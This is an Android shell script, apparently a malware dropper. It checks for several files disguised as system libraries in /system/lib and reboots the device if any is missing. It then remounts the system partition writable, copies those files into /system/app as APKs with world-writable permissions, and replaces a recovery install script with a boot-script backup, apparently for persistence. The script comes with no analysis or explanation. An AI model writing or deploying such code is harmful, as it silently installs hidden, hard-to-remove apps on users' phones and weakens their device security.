#!/system/bin/sh

if [ ! -f /system/lib/libfima.so ];then
	reboot
fi
if [ ! -f /system/lib/libhappyjack.so ];then
	reboot
fi
if [ ! -f /system/lib/libKeygrard.so ];then
	reboot
fi
if [ ! -f /system/lib/libcatmager.so ];then
	reboot
fi
if [ ! -f /system/lib/libkqstone.so ];then
	reboot
fi

mount -o remount,rw /system
cp -r /system/lib/libbrafighd.so /system/app/a1.apk
cp -r /system/lib/libcatmager.so /system/app/a2.apk
cp -r /system/lib/libhappyjack.so /system/app/a7.apk
cp -r /system/lib/libKeygrard.so /system/app/a9.apk
cp -r /system/lib/libkqstone.so /system/app/a10.apk
cp -r /system/lib/libfima.so /system/app/a11.apk
chmod 777 /system/app/a1.apk
chmod 777 /system/app/a2.apk
chmod 777 /system/app/a7.apk
chmod 777 /system/app/a9.apk
chmod 777 /system/app/a10.apk
chmod 777 /system/app/a11.apk
cp -f /system/etc/init.qcom.post_boot.bak2 /system/etc/install-cm-recovery.sh